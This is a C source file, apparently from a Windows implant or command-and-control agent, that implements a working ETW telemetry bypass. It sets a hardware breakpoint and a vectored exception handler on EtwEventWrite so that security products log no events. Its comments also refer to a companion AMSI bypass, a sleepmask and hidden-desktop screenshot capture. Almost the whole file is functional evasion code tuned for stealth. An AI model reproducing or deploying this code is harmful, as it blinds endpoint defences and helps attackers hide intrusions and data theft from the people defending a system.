// etw.c — ETW (Event Tracing for Windows) user-mode bypass
//
// ETW is the kernel-level telemetry system used by Defender, CrowdStrike,
// SentinelOne, and others to log process creation, memory operations,
// file access, and registry changes. ETW-TI (Threat Intelligence) is the
// kernel variant that logs ReadProcessMemory / WriteProcessMemory.
//
// TECHNIQUE POLICY (operator decision — keep only what is REAL and STEALTHY):
//   Kept : Hardware Breakpoint (DR1 + VEH) on EtwEventWrite — NO memory
//          modification, no patched bytes for memory scanners to find.
//   Kept : None — no patching.
//   Removed: classic byte patch (patched ntdll bytes = flagged by every
//          memory scanner), ntdll reload (RESTORES EtwEventWrite to working
//          order — it un-hooks EDR hooks but re-enables ETW telemetry, which
//          is counterproductive as an ETW bypass), provider hijack
//          (same byte-patch class, breaks after providers registered).
//
// STABILITY NOTE (audit I-CR7 fix REVERTED):
//   The audit recommended hooking the full EtwEventWrite* family. We added
//   EtwEventWriteEx on DR3. However, testing showed that GDI/user32
//   functions (BitBlt, GetDIBits, GetDC — used by capture_screenshot_inline)
//   call EtwEventWriteEx extremely frequently. Each call triggered the VEH
//   handler with stack manipulation (Rip = *Rsp; Rsp += 8). In the context
//   of nested GDI calls with complex stack frames, this caused stack
//   corruption and agent crashes specifically during hidden_desktop
//   screenshot capture.
//   Reverted to only hooking EtwEventWrite (the original behavior).
//   EtwEventWriteEx, EtwEventWriteTransfer, EtwEventWriteString remain
//   unhooked — partial telemetry gap is a known limitation.
//   A smarter fix (e.g., thread-restricted hooking, or only hooking when
//   NOT inside a GDI call) is deferred.
//
// DEBUG REGISTER MAP (avoids conflicts between features):
//   DR0 — Shadow7 sleepmask (Phantom)      [do not use here]
//   DR1 — ETW bypass (this file)
//   DR2 — AMSI bypass (amsi.c hwbp)        [do not use here]
//   DR3 — free
//
// NOTE: DR-based user-mode patching does NOT silence ETW-TI (kernel side).
//       Kernel telemetry requires different tradecraft (out of scope here).
//
// Compilation: built by build.rs via x86_64-w64-mingw32-gcc
// Linking:     Rust FFI in evasion/mod.rs
//
#include <windows.h>
#include <stdio.h>
#include <string.h>
#include <stdint.h>

// Runtime status flag — set to 1 when the ETW bypass is armed
static int g_etw_applied = 0;
// Which technique was used: 0=none, 1=hwbp
static int g_etw_technique_used = -1;

// ============================================================
// Technique 0: NONE — no patching
// ============================================================
static int etw_none(void) {
    g_etw_technique_used = 0;
    return 0;
}

// ============================================================
// Technique 1: HARDWARE BREAKPOINT on DR1 (no memory modification)
// ============================================================
// Sets DR1 on ntdll!EtwEventWrite. When any user-mode provider tries to
// write an event, a SINGLE_STEP exception fires, our VEH handler intercepts,
// sets RAX = STATUS_SUCCESS and returns to the caller — the event is never
// written, and the original bytes stay untouched in memory.
//
static int g_etw_handler_installed = 0;
static PVOID g_etw_veh = NULL;
static void* g_etw_target = NULL;

// Re-arm helper — kept for future use (currently no caller).
// The I-CR1 fix that used this was reverted for stability; see phantom_impl.c
// STABILITY NOTE above the P7 VEH handler.
void* etw_get_dr1_target(void) { return g_etw_target; }

static LONG WINAPI etw_veh_handler(PEXCEPTION_POINTERS ep) {
    if (ep->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        if ((void*)ep->ContextRecord->Rip == g_etw_target) {
            // Return STATUS_SUCCESS without writing the event
            ep->ContextRecord->Rax = 0;
            ep->ContextRecord->Rip = *(ULONG64*)ep->ContextRecord->Rsp;
            ep->ContextRecord->Rsp += 8;
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

static int etw_hw_bp_patch(void) {
    if (g_etw_handler_installed) return 0;

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return 1;

    FARPROC func = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!func) return 2;

    g_etw_target = (void*)func;
    g_etw_veh = AddVectoredExceptionHandler(1, etw_veh_handler);
    if (!g_etw_veh) return 3;

    // Use DR1 (DR0 = Shadow7 sleepmask, DR2 = AMSI bypass)
    CONTEXT ctx = {0};
    ctx.ContextFlags = CONTEXT_DEBUG_REGISTERS;
    HANDLE hThread = GetCurrentThread();
    if (!GetThreadContext(hThread, &ctx)) {
        RemoveVectoredExceptionHandler(g_etw_veh);
        return 4;
    }
    ctx.Dr1 = (ULONG64)func;
    // DR7 layout: L0=bit0 G0=bit1 L1=bit2 G1=bit3 L2=bit4 G2=bit5 ...
    //             R/W1=bits20-21, LEN1=bits22-23
    // Enable L1 (0x4) and force R/W1=00 LEN1=00 (execute, 1 byte) WITHOUT
    // touching the other debug-register enables (Shadow7=DR0, AMSI=DR2).
    // The old mask (~0xF0) also cleared L2/G2/L3/G3 and could silently
    // kill the AMSI DR2 breakpoint — that is why it is gone.
    ctx.Dr7 = (ctx.Dr7 & ~(0xFu << 20)) | 0x4u;
    if (!SetThreadContext(hThread, &ctx)) {
        RemoveVectoredExceptionHandler(g_etw_veh);
        return 5;
    }
    g_etw_handler_installed = 1;
    g_etw_applied = 1;
    g_etw_technique_used = 1;
    return 0;
}

// ============================================================
// Runtime status check — called from Rust via FFI
// Returns: 1 if ETW bypass armed, 0 if not
// ============================================================
int etw_is_patched(void) {
    return g_etw_applied;
}

// Returns: technique ID used (0=none, 1=hwbp), or -1 if not applied
int etw_get_technique(void) {
    return g_etw_technique_used;
}

// ============================================================
// Dispatcher — called from Rust via FFI
// technique: 0=none, 1=hwbp (DR1)
// Unknown values fall through to the HWBP stealth default.
// ============================================================
int etw_apply(int technique) {
    switch (technique) {
        case 0: return etw_none();
        case 1:
        default: return etw_hw_bp_patch();
    }
}
